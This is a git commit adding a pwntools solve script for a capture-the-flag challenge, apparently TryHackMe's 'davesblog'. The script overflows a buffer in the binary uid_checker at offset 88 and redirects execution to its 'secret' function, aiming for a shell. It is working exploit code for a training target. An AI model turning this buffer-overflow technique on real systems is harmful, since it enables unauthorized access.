a755352efa222bf9910e0ecf17a3803aa04c54f9
Mark Uche <113513376+markuched13@users.noreply.github.com>
2023-05-10 03:08:54 +0100

    Create solve.py

---
+++ solvescript/thm/davesblog/solve.py
@@ -0,0 +1,51 @@
+#!/usr/bin/python3
+# Author: Hack.You
+from pwn import *
+import warnings
+
+# Allows you to switch between local/GDB/remote from terminal
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+
+# Specify GDB script here (breakpoints etc)
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+# Binary filename
+exe = './uid_checker'
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF(exe, checksec=False)
+# Change logging level to help with debugging (error/warning/info/debug)
+context.log_level = 'info'
+warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")
+# ===========================================================
+#                    EXPLOIT GOES HERE
+# ===========================================================
+
+# Start program
+io = start()
+
+offset = 88
+ret = 0x0000000000400536 # ret;   movaps stack allignment
+
+# Build the payload
+payload = flat({
+    offset: [
+        ret,
+        elf.symbols['secret']
+    ]
+})
+write('payload', payload)
+
+# Send the payload
+io.sendline(payload)
+
+# Got Shell?
